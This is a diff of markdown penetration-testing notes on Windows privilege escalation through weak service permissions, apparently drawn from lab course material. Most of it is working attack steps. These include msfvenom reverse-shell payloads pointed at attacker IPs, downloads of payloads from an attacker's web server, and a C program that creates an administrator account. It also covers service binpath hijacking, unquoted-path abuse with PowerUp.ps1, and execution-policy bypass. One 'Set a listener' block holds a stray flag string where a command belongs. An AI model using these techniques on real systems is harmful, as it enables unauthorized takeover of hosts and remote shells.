@@ -12,7 +12,30 @@ tags:
 
 ## Permissive File System ACLs
 
-### Running SharpUp
+### Previous Listing of  running processes
+
+Display Running Processes:
+
+```
+# With Netstat
+netstat -ano
+
+###### Running processes
+# List running processes:
+Get-Process
+
+
+###### Installed services
+# Several method for retrieving services:
+# 1. GUI snap-in services.msc
+# 2. Get-Service cmd-let
+# 3. Get-Ciminstance cmd-let (super seeding Get-WmiObject)
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+```
+
+
+### Checking Permissions with SharpUp
 
 We can use [SharpUp](sharpup.md) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.
 
@@ -20,91 +43,26 @@ We can use [SharpUp](sharpup.md) from the GhostPack suite of tools to check fo
 .\SharpUp.exe audit
 ```
 
-In the example, the tool identifies the `PC Security Management Service`, which executes the `SecurityService.exe` binary when started.
 
 ### Checking Permissions with icacls
 
-Using icacls we can verify the vulnerability and see that the EVERYONE and BUILTIN\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.
+Syntax:
 
 ```powershell
-icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+Get-Acl -Path "C:\Path\To\File" 
+icacls "C:\Path\To\File"
 ```
 
-Output:
+The permissions
 
-```
-C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
-                                                     Everyone:(I)(F)
-                                                     NT AUTHORITY\SYSTEM:(I)(F)
-                                                     BUILTIN\Administrators:(I)(F)
-                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
-                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
-
-Successfully processed 1 files; Failed processing 0 files
-```
-
-
-### Replacing Service Binary
-
-This service is also startable by unprivileged users. 
-
-We will:
-
-1. make a backup of the original binary
-2. Create a malicious binary with msfvenom
-3. Download it in the target host and replace the original
-4. Set a listener
-5. Establish the connection
-
-We can make a backup of the original binary: 
-
-```cmd-session
-cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
-```
-
-Create  a malicious binary generated with `msfvenom` in out attacking machine:
-
-```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.158 LPORT=8443 -f exe > SecurityService.exe
-```
-
-Serve the malicious file:
-
-```
-python3 -m http.server 8080
-```
-
-Download it from the target host to the needed location:
-
-```
-curl http://10.10.14.158:8080/SecurityService.exe -O "C:\Program Files (x86)\PCProtect\SecurityService.exe"
-```
-
-Set a listener:
-
-```bash
-Aud1t_th0se_s3rv1ce_p3rms!
-```
-
-
-Launch the service and get a reverse shell: 
-
-```powershell
-sc.exe start SecurityService
-```
-
-
-## Permission with AccessChk
-
-### Running SharpUp
-
-We can use [SharpUp](sharpup.md) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.
-
-```powershell
-.\SharpUp.exe audit
-```
-
-In the example, the tool identifies the `WindscribeService`, which is running  the `C:\Program Files (x86)\Windscribe\WindscribeService.exe` binary. 
+| Mask | Permissions             |
+| ---- | ----------------------- |
+| F    | Full access             |
+| M    | Modify access           |
+| RX   | Read and execute access |
+| R    | Read-only access        |
+| W    | Write-only access       |
+When reading the output for the icacls command, the indicator `(I)` preceding the permission means Inherited.
 
 ### Checking Permissions with AccessChk
 
@@ -129,8 +87,142 @@ WindscribeService
 
 Here we can see that all Authenticated Users have [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service, which means full read/write control over it.
 
-### Changing the Service Binary Path
+## Service Binary Hijacking
 
+If we identify a service running elevated that we have write permissions on, we may replace and force the service to restart.
+
+### Alternative #1: Replace the binary manually 
+
+#### Step 1: Create the malicious binary 
+
+##### Cross-compiling our own binary
+
+For instance. Let's create in kali the following binary adduser.c for creating an user and adding them to the Local Administrators group:
+
+```c#
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+```
+
+Now, compile:
+
+```
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+
+##### With msfvenom
+
+Another way is using msfvenom.
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.181 LPORT=8443 -f exe > SecurityService.exe
+```
+
+
+#### Step 2 Make a backup of the original binary
+
+We can make a backup of the original binary: 
+
+```cmd-session
+cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+```
+
+#### Step 3: Replace the original file with you malicious one
+
+Remember the nature of your malicious file. The msfvenom initiates an outbound connection, so get ready and set up a listener.  The adduser.exe binary will add another user.
+
+#### Step 4: Reinitiate the service
+
+Here it's important to run several checks:
+
+Can your user restart the service? If the user can, perfect:
+
+```powershell
+net stop mysql
+net start mysql
+```
+
+Also, another command for restarting a service:
+
+```powershell
+sc.exe stop WindscribeService
+sc.exe start WindscribeService
+```
+
+Otherwise, if we cannot stop or start a service, we must consider another approach. If the service _Startup Type_ is set to "Automatic", we may be able to restart the service by rebooting the machine.  Let's check the Startup Type of the service:
+
+```powershell
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+```
+
+Desired output:
+
+```text
+Name  StartMode
+----  ---------
+mysql Auto
+```
+
+Now, check our own permissions:
+
+```powershell
+whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== ========
+SeSecurityPrivilege           Manage auditing and security log     Disabled
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+Otherwise, let
+```
+
+As we have `SeShutdownPrivilege` restart:
+
+```powershell
+shutdown /r /t 0
+```
+
+Flag `/r` for restarting. Flag `/t`  for waiting 0 seconds.
+
+
+### Alternative #2: Replace the binary  with PowerUp.ps1 
+
+Get the script from: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+
+Directly:
+
+```
+https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Privesc/PowerUp.ps1
+```
+
+Upload it to the target machine. We will use the module **`Get-ModifiableServiceFile`** to retrieve services vulnerables 
+
+```powershell
+iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+ . .\PowerUp.ps1
+Get-ModifiableServiceFile
+```
+
+And here comes the interesting part. **`PowerUp.ps1`** has a built-in function named `AbuseFunction` that takes care automatically of abusing these vulnerable services. The default behavior is to create a new local user called john with the password Password123! and add it to the local Administrators group.  However this is not always working. So the recommendation when so, goes to manual exploitation. 
+
+
+
+### Alternative #3: Changing the Service Binary Path
 Checking the local administrators group confirms that our user htb-student is not a member.
 
 ```powershell
@@ -143,10 +235,7 @@ Let's change it to add our user to the local administrator group. We could set t
 sc.exe config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
 ```
 
-
-### Restarting the Service
-
-Next, we must stop the service, so the new binpath command will run the next time it is started.
+Now we need to restart the service, so the new binpath command will run the next time it is started.
 
 ```powershell
 sc.exe stop WindscribeService
@@ -159,7 +248,8 @@ Now we can confirm that our user htb-student is  a member of the Administrator g
 net localgroup administrators
 ```
 
-### Cleanup: Reverting the Binary Path
+
+**Always Clean-up: Reverting the Binary Path**
 
 ```powershell
 sc.exe config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
@@ -176,13 +266,6 @@ Verifying Service is Running:
 ```powershell
 sc.exe query WindScribeService
 ```
-
-
-## Windows Update Orchestrator Service (UsoSVC)
-
-Another notable example is the Windows [Update Orchestrator Service (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works), which is responsible for downloading and installing operating system updates. It is considered an essential Windows service and cannot be removed. Since it is responsible for making changes to the operating system through the installation of security and feature updates, it runs as the all-powerful `NT AUTHORITY\SYSTEM` account.
-
-Before installing the security patch relating to [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), it was possible to elevate privileges from a service account to `SYSTEM`. This was due to weak permissions, which allowed service accounts to modify the service binary path and start/stop the service.
 
 
 ## Unquoted Service Path
@@ -236,6 +319,42 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findst
 ```
 
 If we find any, we could include a malicious file created with msfvenom that is named after the binary.
+
+### Check access to the paths
+
+Next step is checks access rights in these paths with icacls. If we find a path where we have write access, we may place there our malicious binary. It's not necessary to give it the same name as the program.
+
+
+### Abusing Unquoted Service Paths with PowerUp.ps1
+
+```
+iwr http://$kaliIP/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-UnquotedService
+```
+
+Output:
+
+```
+ServiceName    : GammaService
+Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
+                 Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
+CanRestart     : True
+Name           : GammaService
+```
+
+Attacking the vulnerable service, by default it will create a user named john that will be added to the Local Administrators group:
+
+```powershell
+Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+Restart-Service GammaService
+net user
+net localgroup administrators
+```
 
 ## Permissive Registry ACLs
 
@@ -307,4 +426,11 @@ Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
  Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.
 
 This [post](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html) and [this site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detail many potential autorun locations on Windows systems.
+
+## Windows Update Orchestrator Service (UsoSVC)
+
+Another notable example is the Windows [Update Orchestrator Service (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works), which is responsible for downloading and installing operating system updates. It is considered an essential Windows service and cannot be removed. Since it is responsible for making changes to the operating system through the installation of security and feature updates, it runs as the all-powerful `NT AUTHORITY\SYSTEM` account.
+
+Before installing the security patch relating to [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), it was possible to elevate privileges from a service account to `SYSTEM`. This was due to weak permissions, which allowed service accounts to modify the service binary path and start/stop the service.
+
 
